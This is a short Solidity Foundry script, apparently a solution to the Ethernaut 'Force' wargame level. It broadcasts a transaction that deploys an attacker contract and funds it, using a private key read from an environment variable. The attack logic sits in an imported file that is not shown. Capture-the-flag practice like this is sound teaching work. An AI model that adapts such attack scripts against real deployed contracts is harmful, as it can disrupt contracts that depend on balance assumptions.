// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "ethernaut/Force/ForceAttack.sol";
import "ethernaut/Force/Force.sol";
import "forge-std/Test.sol";
import "ethernaut/EthernautTestHelpers.sol";

contract Force_script is Test, EthernautTestHelpers {
    function run() public {
        uint256 PKEY = vm.envUint("DEPLOYMENT_KEY");
        vm.startBroadcast(PKEY);
        // Force instance = Force(0x23f27a4F6d21c1e81cEb6b08733D2fD838a56775);
        ForceAttack attacker = new ForceAttack();
        (bool success, ) = address(attacker).call{value: 0.00001 ether}("");
        require(success, "Failed to transfer to Attacker.");
        vm.stopBroadcast();
    }
}
